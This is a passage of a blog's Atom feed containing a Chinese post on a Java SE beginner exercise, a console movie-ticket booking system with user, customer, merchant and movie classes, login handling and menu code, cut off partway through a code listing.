<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>东雲研究所</title>
  
  <subtitle>我们所经历的每一个平凡的日常，也许就是连续发生的奇迹</subtitle>
  <link href="http://electq.github.io/atom.xml" rel="self"/>
  
  <link href="http://electq.github.io/"/>
  <updated>2022-06-06T17:41:42.211Z</updated>
  <id>http://electq.github.io/</id>
  
  <author>
    <name>东雲</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>电影购票系统</title>
    <link href="http://electq.github.io/2022/06/06/%E7%94%B5%E5%BD%B1%E8%B4%AD%E7%A5%A8%E7%B3%BB%E7%BB%9F/"/>
    <id>http://electq.github.io/2022/06/06/%E7%94%B5%E5%BD%B1%E8%B4%AD%E7%A5%A8%E7%B3%BB%E7%BB%9F/</id>
    <published>2022-06-06T08:33:36.000Z</published>
    <updated>2022-06-06T17:41:42.211Z</updated>
    
    <content type="html"><![CDATA[<p>记录今天关于JavaSE基础部分的练习，涉及到面向对象，继承，Static，List，Map，日志等方面的内容</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206070141124.png" alt="illust_67769848_20210308_195406"></p><span id="more"></span><h3 id="日志部署"><a href="#日志部署" class="headerlink" title="日志部署"></a>日志部署</h3><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206070019054.png" alt="image-20220607001912025"></p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206070019407.png" alt="image-20220607001927375"></p><h3 id="系统角色类"><a href="#系统角色类" class="headerlink" title="系统角色类"></a>系统角色类</h3><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206061637192.png" alt="image-20220606163721050"></p><p>Movie类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Movie</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name; <span class="comment">//电影名称</span></span><br><span class="line">    <span class="keyword">private</span> String actor; <span class="comment">//主演</span></span><br><span class="line">    <span class="keyword">private</span> Double score; <span class="comment">//评分</span></span><br><span class="line">    <span class="keyword">private</span> Double price; <span class="comment">//票价</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> number; <span class="comment">//余票</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> time; <span class="comment">//放映时长</span></span><br><span class="line">    <span class="keyword">private</span> Date startTime; <span class="comment">//开始放映时间</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Movie</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//评分由用户来评价所以不放入</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Movie</span><span class="params">(String name, String actor, Double price, <span class="type">int</span> number, <span class="type">double</span> time, Date startTime)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.actor = actor;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">        <span class="built_in">this</span>.number = number;</span><br><span class="line">        <span class="built_in">this</span>.time = time;</span><br><span class="line">        <span class="built_in">this</span>.startTime = startTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getActor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> actor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setActor</span><span class="params">(String actor)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.actor = actor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Double <span class="title function_">getScore</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setScore</span><span class="params">(Double score)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Double <span class="title function_">getPrice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(Double price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNumber</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNumber</span><span class="params">(<span class="type">int</span> number)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.number = number;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTime</span><span class="params">(<span class="type">double</span> time)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.time = time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Date <span class="title function_">getStartTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> startTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStartTime</span><span class="params">(Date startTime)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.startTime = startTime;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>User类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.itheima.bean;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 用户类（客户和商家的父类）</span><br><span class="line"> */</span><br><span class="line">public class User &#123;</span><br><span class="line">    private String loginName; //昵称</span><br><span class="line">    private String userName; //真实姓名</span><br><span class="line">    private String passWord; //密码</span><br><span class="line">    private char sex; //性别</span><br><span class="line">    private String phone; //电话</span><br><span class="line">    private double money; //账户余额</span><br><span class="line"></span><br><span class="line">    public User()&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public User(String loginName, String userName, String passWord, char sex, String phone, double money) &#123;</span><br><span class="line">        this.loginName = loginName;</span><br><span class="line">        this.userName = userName;</span><br><span class="line">        this.passWord = passWord;</span><br><span class="line">        this.sex = sex;</span><br><span class="line">        this.phone = phone;</span><br><span class="line">        this.money = money;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getLoginName() &#123;</span><br><span class="line">        return loginName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setLoginName(String loginName) &#123;</span><br><span class="line">        this.loginName = loginName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getUserName() &#123;</span><br><span class="line">        return userName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setUserName(String userName) &#123;</span><br><span class="line">        this.userName = userName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getPassWord() &#123;</span><br><span class="line">        return passWord;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setPassWord(String passWord) &#123;</span><br><span class="line">        this.passWord = passWord;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public char getSex() &#123;</span><br><span class="line">        return sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setSex(char sex) &#123;</span><br><span class="line">        this.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getPhone() &#123;</span><br><span class="line">        return phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setPhone(String phone) &#123;</span><br><span class="line">        this.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public double getMoney() &#123;</span><br><span class="line">        return money;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setMoney(double money) &#123;</span><br><span class="line">        this.money = money;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Customer类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.itheima.bean;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 客户类</span><br><span class="line"> */</span><br><span class="line">public class Customer extends User&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Business类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.bean;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 商家类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Business</span> <span class="keyword">extends</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String shopName; <span class="comment">//店铺名字</span></span><br><span class="line">    <span class="keyword">private</span> String address; <span class="comment">//店铺地址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getShopName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> shopName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setShopName</span><span class="params">(String shopName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.shopName = shopName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddress</span><span class="params">(String address)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="首页，登录，商家界面，用户界面设计"><a href="#首页，登录，商家界面，用户界面设计" class="headerlink" title="首页，登录，商家界面，用户界面设计"></a>首页，登录，商家界面，用户界面设计</h3><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206061722960.png" alt="image-20220606172257882"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.run;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.itheima.bean.Business;</span><br><span class="line"><span class="keyword">import</span> com.itheima.bean.Customer;</span><br><span class="line"><span class="keyword">import</span> com.itheima.bean.Movie;</span><br><span class="line"><span class="keyword">import</span> com.itheima.bean.User;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MovieSystem</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 定义系统的数据容器给用户存储</span></span><br><span class="line"><span class="comment">     * 1.封装很多对象（用户对象，商家对象）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;User&gt; ALL_USERS = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 2.存储系统全部的商家和排片信息</span></span><br><span class="line"><span class="comment">     * 商家1 =【p1,p2,p3】</span></span><br><span class="line"><span class="comment">     * 商家2 =【p1,p2,p3】</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;Business,List&lt;Movie&gt;&gt; ALL_MOVIES = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 3.准备一些测试用户信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="type">Customer</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Customer</span>();</span><br><span class="line">        c.setLoginName(<span class="string">&quot;古娜娜黑暗之神&quot;</span>);</span><br><span class="line">        c.setUserName(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        c.setPassWord(<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        c.setSex(<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line">        c.setMoney(<span class="number">365.45</span>);</span><br><span class="line">        c.setPhone(<span class="string">&quot;18859971666&quot;</span>);</span><br><span class="line">        ALL_USERS.add(c);</span><br><span class="line"></span><br><span class="line">        <span class="type">Business</span> <span class="variable">b</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Business</span>();</span><br><span class="line">        b.setLoginName(<span class="string">&quot;小关铺子&quot;</span>);</span><br><span class="line">        b.setUserName(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">        b.setPassWord(<span class="string">&quot;admin123&quot;</span>);</span><br><span class="line">        b.setSex(<span class="string">&#x27;女&#x27;</span>);</span><br><span class="line">        b.setPhone(<span class="string">&quot;0591-13456789&quot;</span>);</span><br><span class="line">        b.setMoney(<span class="number">1110.58</span>);</span><br><span class="line">        b.setShopName(<span class="string">&quot;天天电影院&quot;</span>);</span><br><span class="line">        b.setAddress(<span class="string">&quot;旗山大道56号&quot;</span>);</span><br><span class="line">        ALL_USERS.add(b);</span><br><span class="line">        <span class="comment">//必须将商家信息添加到排片信息中</span></span><br><span class="line">        List&lt;Movie&gt; movies = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        ALL_MOVIES.put(b,movies);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 4.一个通用的scanner</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Scanner</span> <span class="variable">SYS_SC</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *5.用一个静态的用户对象记录当前成功登录的用户对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> User loginUser;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        showMain();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">showMain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============黑马电影================&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;1.登录&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;2.用户注册&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;3.商家注册&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;根据输入数字选择&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            <span class="keyword">switch</span> (command)&#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;1&quot;</span>):</span><br><span class="line">                    <span class="comment">//登录</span></span><br><span class="line">                    login();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;2&quot;</span>):</span><br><span class="line">                    <span class="comment">//用户注册</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;3&quot;</span>):</span><br><span class="line">                    <span class="comment">//商家注册</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;您的输入不规范，请重新输入&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请输入您的昵称&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">loginName</span> <span class="operator">=</span>SYS_SC.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;请输入您的密码&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span>SYS_SC.nextLine();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//1.根据登录名称得查询对象</span></span><br><span class="line">            <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span>CheckLoginName(loginName);</span><br><span class="line">            <span class="comment">//2.判断对象是否存在</span></span><br><span class="line">            <span class="keyword">if</span> (u != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="comment">//3.判断密码是否正确</span></span><br><span class="line">                <span class="keyword">if</span>(u.getPassWord().equals(password))&#123;</span><br><span class="line">                    <span class="comment">//密码正确~~</span></span><br><span class="line">                    <span class="comment">//判断登录类型</span></span><br><span class="line">                    loginUser =u;</span><br><span class="line">                    <span class="keyword">if</span> (u <span class="keyword">instanceof</span> Customer)&#123;</span><br><span class="line">                        showCustomerMain();</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        showBusinessMain();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//在正常登录情况下用户在此退出</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;密码错误请重新输入&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;用户名错误请重新输入&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商家操作界面</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">showBusinessMain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============黑马电影商家================&quot;</span>);</span><br><span class="line">            System.out.println(loginUser.getUserName()+ (loginUser.getSex()==<span class="string">&#x27;男&#x27;</span>? <span class="string">&quot;先生&quot;</span>:<span class="string">&quot;女士&quot;</span>)+<span class="string">&quot;欢迎您登录系统&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;1.展示详情&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;2.上架电影&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;3.下架电影&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;4.修改电影&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;5.退出&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;请您根据数字做出操作&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            <span class="keyword">switch</span> (command)&#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;1&quot;</span>):</span><br><span class="line">                    <span class="comment">//展示详情</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;2&quot;</span>):</span><br><span class="line">                    <span class="comment">//上架</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;3&quot;</span>):</span><br><span class="line">                    <span class="comment">//下架</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;4&quot;</span>):</span><br><span class="line">                    <span class="comment">//修改</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;5&quot;</span>):</span><br><span class="line">                    <span class="comment">//退出</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;您的输入有误请重新输入&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户操作界面</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">showCustomerMain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============黑马电影用户================&quot;</span>);</span><br><span class="line">            System.out.println(loginUser.getUserName()+ (loginUser.getSex()==<span class="string">&#x27;男&#x27;</span>? <span class="string">&quot;先生&quot;</span>:<span class="string">&quot;女士&quot;</span>)+<span class="string">&quot;欢迎您登录系统&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;1.展示全部影片信息&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;2.根据电影名称查询信息&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;3.评分系统&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;4.购票系统&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;5.退出系统&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;请您根据数字做出选择&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            <span class="keyword">switch</span> (command)&#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;1&quot;</span>):</span><br><span class="line">                    <span class="comment">//展示全部排片信息</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;2&quot;</span>):</span><br><span class="line">                    <span class="comment">//查询</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;3&quot;</span>):</span><br><span class="line">                    <span class="comment">//评分</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;4&quot;</span>):</span><br><span class="line">                    <span class="comment">//购票</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;5&quot;</span>):</span><br><span class="line">                    <span class="comment">//退出</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;您的输入有误请重新输入&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 登录校验</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loginName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  User <span class="title function_">CheckLoginName</span><span class="params">(String loginName)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (User User : ALL_USERS) &#123;</span><br><span class="line">            <span class="comment">//通过遍历判断是否存在这个用户名</span></span><br><span class="line">            <span class="keyword">if</span>(User.getLoginName().equals(loginName))&#123;</span><br><span class="line">                <span class="keyword">return</span> User;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="商家功能-影片下架-影片修改"><a href="#商家功能-影片下架-影片修改" class="headerlink" title="商家功能-影片下架 影片修改"></a>商家功能-影片下架 影片修改</h3><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206062159471.png" alt="image-20220606215941394"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.run;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.itheima.bean.Business;</span><br><span class="line"><span class="keyword">import</span> com.itheima.bean.Customer;</span><br><span class="line"><span class="keyword">import</span> com.itheima.bean.Movie;</span><br><span class="line"><span class="keyword">import</span> com.itheima.bean.User;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MovieSystem</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 定义系统的数据容器给用户存储</span></span><br><span class="line"><span class="comment">     * 1.封装很多对象（用户对象，商家对象）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;User&gt; ALL_USERS = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 2.存储系统全部的商家和排片信息</span></span><br><span class="line"><span class="comment">     * 商家1 =【p1,p2,p3】</span></span><br><span class="line"><span class="comment">     * 商家2 =【p1,p2,p3】</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;Business,List&lt;Movie&gt;&gt; ALL_MOVIES = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 3.准备一些测试用户信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="type">Customer</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Customer</span>();</span><br><span class="line">        c.setLoginName(<span class="string">&quot;古娜娜黑暗之神&quot;</span>);</span><br><span class="line">        c.setUserName(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        c.setPassWord(<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        c.setSex(<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line">        c.setMoney(<span class="number">365.45</span>);</span><br><span class="line">        c.setPhone(<span class="string">&quot;18859971666&quot;</span>);</span><br><span class="line">        ALL_USERS.add(c);</span><br><span class="line"></span><br><span class="line">        <span class="type">Business</span> <span class="variable">b</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Business</span>();</span><br><span class="line">        b.setLoginName(<span class="string">&quot;小关铺子&quot;</span>);</span><br><span class="line">        b.setUserName(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">        b.setPassWord(<span class="string">&quot;admin123&quot;</span>);</span><br><span class="line">        b.setSex(<span class="string">&#x27;女&#x27;</span>);</span><br><span class="line">        b.setPhone(<span class="string">&quot;0591-13456789&quot;</span>);</span><br><span class="line">        b.setMoney(<span class="number">1110.58</span>);</span><br><span class="line">        b.setShopName(<span 